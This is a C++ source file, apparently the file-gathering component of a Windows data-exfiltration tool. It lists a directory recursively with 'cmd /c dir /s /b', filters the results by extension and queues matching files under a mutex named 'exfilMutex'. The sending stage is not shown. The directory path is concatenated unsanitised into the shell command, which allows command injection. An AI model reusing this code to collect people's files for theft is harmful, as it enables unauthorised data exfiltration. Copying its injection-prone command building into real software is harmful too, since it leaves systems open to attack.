#include "gatherer.h"
#include <iostream>
#include <cstdlib>
#include <vector>
#include <string>
#include <cstdio>

std::queue<std::string> fileQueue;
std::mutex exfilMutex;
std::condition_variable cv;
bool doneGathering = false;

bool hasExtension(const std::string& filePath, const std::vector<std::string>& extensions) {
    for (const auto& ext : extensions) {
        if (filePath.size() >= ext.size() &&
            filePath.compare(filePath.size() - ext.size(), ext.size(), ext) == 0) {
            return true;
        }
    }
    return false;
}

std::vector<std::string> runCommand(const std::string& command) {
    std::vector<std::string> result;
    FILE* pipe = _popen(command.c_str(), "r");

    if (!pipe) {
        std::cerr << "[ERROR] Failed to run command: " << command << std::endl;
        return result;
    }

    char buffer[4096];
    while (fgets(buffer, sizeof(buffer), pipe)) {
        std::string line(buffer);
        line.erase(line.find_last_not_of("\r\n") + 1); // Trim newlines
        result.push_back(line);
    }

    _pclose(pipe);
    return result;
}

void gatherFiles(const std::string& directoryPath, const std::vector<std::string>& extensions) {
    try {
        std::string command = "cmd /c dir /s /b \"" + directoryPath + "\" 2>nul"; // Redirect errors to null
        std::vector<std::string> files = runCommand(command);

        {
            std::lock_guard<std::mutex> lock(exfilMutex);
            for (const auto& file : files) {
                if (hasExtension(file, extensions)) {
                    fileQueue.push(file);
                }
            }
        }
        cv.notify_all();
    } catch (const std::exception& e) {
        std::cerr << "[ERROR] Exception during file gathering: " << e.what() << std::endl;
    }
}
